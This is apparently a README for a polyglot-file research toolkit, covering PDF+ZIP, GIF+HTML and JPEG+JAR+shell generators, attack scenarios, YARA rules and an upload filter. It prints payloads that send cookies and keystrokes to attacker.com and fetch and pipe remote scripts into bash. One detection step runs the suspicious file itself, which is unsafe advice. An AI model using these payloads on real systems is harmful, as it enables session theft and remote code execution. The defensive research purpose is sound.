# Cross-Format Polyglot Research

**Files Valid in Multiple Formats Simultaneously**

This directory contains cutting-edge research into cross-format polyglots - files that are valid as TWO or MORE different file formats at the same time.

---

## 🎯 What Are Cross-Format Polyglots?

Unlike traditional steganography (which hides data in a single-format file), cross-format polyglots are **simultaneously valid** in multiple formats:

| Polyglot Type | Formats | Risk Level |
|---------------|---------|------------|
| **PDF+ZIP** | PDF Document + ZIP Archive | HIGH |
| **GIF+HTML** | GIF Image + HTML Page | CRITICAL |
| **JPEG+JAR+Shell** | JPEG Image + JAR + Shell Script | CRITICAL |

---

## 📁 Directory Structure

```
cross_format_polyglots/
├── pdf_zip/
│   └── pdf_zip_polyglot.c       # PDF+ZIP generator
├── gif_html/
│   └── gif_html_polyglot.c      # GIF+HTML generator
├── jpeg_jar_shell/
│   └── jpeg_jar_shell_polyglot.c # Triple-format generator
├── tools/
│   └── polyglot_analyzer.c      # Detection/analysis tool
├── docs/
│   └── TECHNIQUES.md            # Technical documentation
├── samples/
│   └── (generated polyglots)
└── README.md                    # This file
```

---

## 🚀 Quick Start

### Build All Tools

```bash
cd cross_format_polyglots
make all
```

### Generate Polyglots

#### PDF+ZIP Polyglot
```bash
cd pdf_zip
./pdf_zip_gen --add payload.sh --add data.txt --output dual.pdf

# Test it
evince dual.pdf      # Opens as PDF
unzip -l dual.pdf    # Lists ZIP contents
```

#### GIF+HTML Polyglot
```bash
cd gif_html
./gif_html_gen --demo
./gif_html_gen --html demo_payload.html --output polyglot.gif

# Test it
display polyglot.gif          # Shows as image
firefox polyglot.gif          # Executes JavaScript!
```

#### JPEG+JAR+Shell Triple Polyglot
```bash
cd jpeg_jar_shell
./jpeg_jar_shell_gen --demo
./jpeg_jar_shell_gen --shell payload.sh --output triple.jpg

# Test it
display triple.jpg       # Shows as JPEG
java -jar triple.jpg     # Runs as JAR
./triple.jpg             # Executes as shell script
```

### Analyze Suspicious Files

```bash
cd tools
./polyglot_analyzer suspicious.gif
./polyglot_analyzer *.pdf *.jpg
```

---

## 🔬 Technical Details

### 1. PDF+ZIP Polyglot

**Technique:**
- PDF specification allows up to 1024 bytes before `%PDF` header
- ZIP archive placed before PDF content
- Both parsers happy: ZIP reads from start, PDF skips to `%PDF`

**Structure:**
```
┌──────────────────────┐
│ ZIP Archive          │ ← unzip reads this
│ [Local file headers] │
│ [Central directory]  │
├──────────────────────┤
│ %PDF-1.4             │ ← PDF readers start here
│ PDF Objects          │
│ %%EOF                │
└──────────────────────┘
```

**Attack Scenarios:**
- Bypass email attachment filters (scans as PDF)
- Extract malicious files (unzip reveals hidden content)
- Hide offensive documents in "innocent" PDFs

**Detection:**
```bash
# Check for ZIP signature before PDF
hexdump -C file.pdf | head -3
# Look for: 50 4B 03 04 (PK..) before 25 50 44 46 (%PDF)
```

---

### 2. GIF+HTML Polyglot

**Technique:**
- GIF Comment Extension allows arbitrary data
- HTML browsers ignore binary data before `<!DOCTYPE>`
- Embed complete HTML page after GIF structure

**Structure:**
```
┌──────────────────────┐
│ GIF89a               │ ← Image viewers read this
│ [Image data]         │
│ <!--                 │ ← Start HTML comment
│ GIF trailer (0x3B)   │
├──────────────────────┤
│ --><!DOCTYPE html>   │ ← Browsers start here
│ <html>               │
│   <script>           │
│     alert('XSS!');   │
│   </script>          │
│ </html>              │
└──────────────────────┘
```

**Attack Scenarios:**
- Upload "image" to website
- Filter checks: ✅ Valid GIF magic bytes
- Direct access: Executes JavaScript → **XSS**
- Steal cookies, sessions, credentials

**Real-World Exploitation:**
```html
<!-- Example malicious payload -->
<script>
  // Cookie theft
  fetch('https://attacker.com/log?cookie=' + document.cookie);

  // Keylogging
  document.addEventListener('keydown', e => {
    fetch('https://attacker.com/keys?k=' + e.key);
  });

  // Phishing overlay
  document.body.innerHTML = '<div>Session expired. Re-login:</div>';
</script>
```

**Detection:**
```bash
# Search for HTML tags after GIF trailer
strings image.gif | grep -E '<html|<script|DOCTYPE'
```

---

### 3. JPEG+JAR+Shell Triple Polyglot

**Technique (Most Complex):**
- JPEG COM marker allows arbitrary comments
- JAR/ZIP can have prepended data (self-extracting archives)
- Shebang (`#!/bin/sh`) for shell execution
- All three parsers coexist peacefully

**Structure:**
```
┌──────────────────────┐
│ #!/bin/sh            │ ← Shell starts here
│ #/*                  │ ← Comment in shell
├──────────────────────┤
│ [JPEG data]          │ ← Image viewers read this
│ [COM marker]         │
│ [JPEG EOI]           │
├──────────────────────┤
│ [JAR/ZIP data]       │ ← Java reads from central dir
│ [Central directory]  │
├──────────────────────┤
│ */                   │ ← End comment
│ exec java -jar "$0"  │ ← Shell executes this
│ exit $?              │
└──────────────────────┘
```

**Attack Scenarios:**
- Upload as "photo.jpg" → Bypass image filters
- Execute as shell → Install backdoor, download malware
- Execute as JAR → Run Java exploit, keylogger
- Display as JPEG → Social engineering (looks innocent)

**Real Exploitation:**
```bash
# Shell payload
#!/bin/sh
curl http://attacker.com/malware.sh | bash
```

```java
// JAR payload
Runtime.getRuntime().exec("bash -c 'curl attacker.com/shell.sh|bash'");
```

**Detection:**
```bash
# Multi-pronged check
file suspicious.jpg              # Check file type
strings suspicious.jpg | head   # Look for shebang
jar tf suspicious.jpg           # Try as JAR
chmod +x suspicious.jpg && ./suspicious.jpg  # Test execution
```

---

## 🛡️ Defense Strategies

### 1. Strict Format Validation

**Don't rely on:**
- ❌ File extensions
- ❌ MIME types
- ❌ Magic byte checks only

**Do implement:**
- ✅ Full file structure validation
- ✅ Reject files with multiple valid formats
- ✅ Parse entire file (not just header)
- ✅ Check for data after expected EOF

### 2. Detection Rules

**YARA Rule for PDF+ZIP:**
```yara
rule PDF_ZIP_Polyglot {
    strings:
        $pdf = "%PDF" ascii
        $zip = { 50 4B 03 04 }
    condition:
        $zip at 0 and $pdf
}
```

**YARA Rule for GIF+HTML:**
```yara
rule GIF_HTML_Polyglot {
    strings:
        $gif = { 47 49 46 38 }
        $html1 = "<!DOCTYPE" nocase
        $html2 = "<html" nocase
        $html3 = "<script" nocase
    condition:
        $gif at 0 and any of ($html*)
}
```

**YARA Rule for JPEG+JAR+Shell:**
```yara
rule JPEG_JAR_Shell_Polyglot {
    strings:
        $jpeg = { FF D8 FF }
        $zip = { 50 4B 03 04 }
        $shebang = "#!/" ascii
    condition:
        $jpeg at 0 and $zip and $shebang
}
```

### 3. Upload Filter Implementation

**Secure File Upload (Python Flask Example):**
```python
from PIL import Image
import magic
import zipfile

def secure_upload(file):
    # Check 1: File extension
    if not file.filename.endswith(('.png', '.jpg', '.gif')):
        return False, "Invalid extension"

    # Check 2: MIME type
    mime = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    if mime not in ['image/png', 'image/jpeg', 'image/gif']:
        return False, "Invalid MIME type"

    # Check 3: Try to parse as image
    try:
        img = Image.open(file)
        img.verify()
    except:
        return False, "Not a valid image"

    # Check 4: Scan for polyglot signatures
    file.seek(0)
    content = file.read()

    # Reject if contains ZIP signature
    if b'PK\x03\x04' in content:
        return False, "ZIP signature detected in image"

    # Reject if contains HTML
    if b'<!DOCTYPE' in content or b'<html' in content.lower():
        return False, "HTML detected in image"

    # Reject if executable
    if content.startswith(b'#!/'):
        return False, "Shebang detected in image"

    return True, "OK"
```

### 4. Content Security Policy

**For web applications:**
```http
Content-Security-Policy:
    default-src 'self';
    img-src 'self' data: https:;
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'nonce-{random}';
    object-src 'none';
```

This prevents uploaded images from executing scripts even if polyglot.

---

## 📊 Research Applications

### 1. Security Testing
- Test upload filter robustness
- Demonstrate bypass techniques
- Train security analysts

### 2. Malware Analysis
- Study APT evasion techniques
- Analyze real-world polyglots
- Develop detection signatures

### 3. Academic Research
- File format security
- Parser differential analysis
- Novel CVE discovery

### 4. Red Team Operations
- Social engineering campaigns
- Payload delivery mechanisms
- Defense evasion testing

---

## ⚠️ Responsible Use

### ✅ Authorized Uses
- Security research and education
- Authorized penetration testing
- Defensive security development
- Academic studies

### ❌ Prohibited Uses
- Malicious attacks
- Unauthorized access
- Real-world exploitation
- Illegal activities

---

## 📚 References

### Research Papers
1. **Ange Albertini** - "Funky File Formats" (Corkami, 2014)
2. **Gynvael Coldwind** - "Polyglot Challenge" (2015)
3. **OWASP** - "Unrestricted File Upload" (2020)

### Techniques
- PDF prepended data allowance (ISO 32000)
- JAR/ZIP self-extracting archives
- GIF Comment Extension (GIF89a spec)
- HTML parser resilience

### CVEs Related to Polyglots
- **CVE-2017-5029** - Chrome PDF polyglot
- **CVE-2018-5002** - Flash + PDF polyglot
- **CVE-2016-4117** - Flash + JPEG polyglot

---

## 🔧 Build & Test

### Compile All

```bash
make all
```

### Run Tests

```bash
make test
```

### Clean

```bash
make clean
```

---

## 📈 Future Work

Planned expansions:

1. **Additional Formats**
   - DOCX+ZIP polyglots
   - MP4+HTML polyglots
   - PNG+JAR polyglots

2. **Advanced Techniques**
   - Triple+ format polyglots (4-5 formats)
   - Polymorphic polyglots
   - Self-modifying polyglots

3. **Defensive Tools**
   - Automated scanner
   - CI/CD integration
   - Real-time detection

4. **Research**
   - Parser differential fuzzing
   - Novel format combinations
   - CVE discovery

---

## 📞 Contact

**Research Questions:** research@polygottem.io
**Security Issues:** security@polygottem.io
**GitHub:** https://github.com/SWORDIntel/POLYGOTTEM

---

**Version:** 1.0.0
**Release Date:** 2025-11-08
**Status:** Research Prototype
**License:** Educational Use Only
